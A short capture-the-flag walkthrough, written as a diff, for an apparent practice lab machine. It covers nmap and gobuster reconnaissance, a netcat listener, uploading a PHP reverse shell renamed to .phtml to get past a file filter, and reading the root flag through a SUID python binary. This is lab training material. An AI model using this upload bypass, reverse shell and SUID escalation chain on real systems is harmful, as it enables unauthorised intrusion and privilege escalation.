@@ -1,0 +1,47 @@
+0. deploy the machine 
+1. use nmap to look for open ports 
+   sudo nmap -sS ip -Pn 
+   2 open ports (ssh,http) 
+   ans:2
+2. use nmap to look for version of apache
+   sudo nmap -sV ip -Pn
+   ans:2.4.29 
+3. already we know ssh service running under port 22
+   ans:ssh
+4. no need
+5. use gobuster with wordlist
+   gobuster -u ip -w /pathtowordlist -t 40 
+   ans:/panel/
+
+
+6. attack machine
+   nc  -lvnp 2559
+
+   
+   open browser 
+   http://ip/panel
+   you can upload the file but it dont accept the "php" files 
+   use php reverse shell payload 
+   edit the ip with your opennetwork ip and desired port number 
+   save payload with ".phtml" extension and upload 
+   http://ip/uploads
+   click your file 
+    
+
+   attack machine 
+   now you got the shell 
+   
+
+   user.txt
+   find / -name "user.txt"
+   cat /var/www/user.txt
+   Ans:#you got the user flag
+
+   root.txt
+   SUID process 
+   find / -user root -perm /4000
+   Ans:/usr/bin/python is wired 
+   #flag
+   python -c 'print(open("/root/root.txt").read())'
+   Ans:# you got the flag 
+happy hacking
